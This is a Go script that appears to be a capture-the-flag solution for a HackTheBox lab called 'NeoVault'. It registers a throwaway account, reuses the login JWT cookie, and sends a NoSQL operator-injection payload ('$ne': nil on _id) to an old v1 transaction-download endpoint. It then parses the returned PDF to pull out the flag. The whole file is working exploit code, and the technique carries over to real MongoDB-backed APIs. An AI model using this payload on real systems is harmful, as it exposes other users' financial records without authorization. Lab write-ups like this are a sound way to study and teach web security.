package main

import (
	"net/http"
	"fmt"
	"flag"
	"log"
	"io"
	"os"
	"encoding/json"
	"time"
	"math/rand"
	"io/ioutil"
	"bytes"
	"rsc.io/pdf"
	"strings"
	"regexp"
)

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randSeq(n int) string {
	rand.Seed(time.Now().UnixNano())
    b := make([]rune, n)
    for i := range b {
        b[i] = letters[rand.Intn(len(letters))]
    }
    return string(b)
}

func postData(target_url string, payloadData map[string]interface{}) *http.Response {
	payloadJsonData, err := json.Marshal(payloadData)
	if err != nil {
		panic(err)
	}

	req, err := http.NewRequest("POST", target_url, bytes.NewBuffer(payloadJsonData))
	if err != nil {
		panic(err)
	}
	req.Header.Set("Content-Type", "application/json")
	client := &http.Client{}
	resp, err := client.Do(req)

	if err != nil {
		panic(err)
	}
	return resp
}

func postDataWithJwt(target_url string, payloadData map[string]map[string]interface{}, jwtToken string) *http.Response {
	payloadJsonData, err := json.Marshal(payloadData)
	if err != nil {
		panic(err)
	}

	req, err := http.NewRequest("POST", target_url, bytes.NewBuffer(payloadJsonData))
	if err != nil {
		panic(err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.AddCookie(&http.Cookie{Name: "token", Value: jwtToken})
	client := &http.Client{}
	resp, err := client.Do(req)

	if err != nil {
		panic(err)
	}
	return resp
}

func main() {
	targetUrl := flag.String("target_url", "", "Target url for NeoVault")
flag.Parse()

	if *targetUrl == "" {
		log.Println("Error: No target URL provided")
		flag.PrintDefaults()
		os.Exit(1)
	}

	registerUrl := fmt.Sprintf("%s/api/v2/auth/register", *targetUrl)

	fmt.Printf("\nRegistering user at %s\n", registerUrl)
	registerData := map[string]interface{}{
		"username": randSeq(8),
		"email": fmt.Sprintf("%s@a.aa", randSeq(8)),
		"password": fmt.Sprintf("%s@a.aa", randSeq(8)),
	}
	registerResp := postData(registerUrl, registerData)
	defer registerResp.Body.Close()

	if registerResp.Status != "201 Created" {
		panic("Non 201 status received during register")
	}


	loginUrl := fmt.Sprintf("%s/api/v2/auth/login", *targetUrl)

	fmt.Printf("Logging in user at %s\n", loginUrl)

	loginData := map[string]interface{}{
		"email": registerData["email"],
		"password": registerData["password"],
	}
	loginResp := postData(loginUrl, loginData)
	defer loginResp.Body.Close()

	body, err := ioutil.ReadAll(loginResp.Body)
	if err != nil {
		panic(err)
	}

	fmt.Printf("Login response: %s\n", body)

	var jwtToken string
	for _, cookie := range loginResp.Cookies() {
		if cookie.Name == "token" {
			jwtToken = cookie.Value
		}
	}

	exploitUrl := fmt.Sprintf("%s/api/v1/transactions/download-transactions", *targetUrl)
	fmt.Printf("Sending exploit payload to %s\n", exploitUrl)

	exploitData := map[string]map[string]interface{}{
		"_id": {"$ne":nil},
	}
	exploitResp := postDataWithJwt(exploitUrl, exploitData, jwtToken)
	defer exploitResp.Body.Close()

	pdfBytes, err := io.ReadAll(exploitResp.Body)
	reader := bytes.NewReader(pdfBytes)

	pdfReader, err := pdf.NewReader(reader, int64(len(pdfBytes)))
	if err != nil {
		panic(err)
	}

	page := pdfReader.Page(1)

	var textBuilder strings.Builder
	texts := page.Content().Text
	for _, t := range texts {
		textBuilder.WriteString(t.S)
	}
	pageText := textBuilder.String()
	re := regexp.MustCompile(`HTB\{[^{}]*\}`)

	flag := re.FindString(pageText)
	fmt.Printf("\n\nFlag: \n\n%s\n", flag)

}


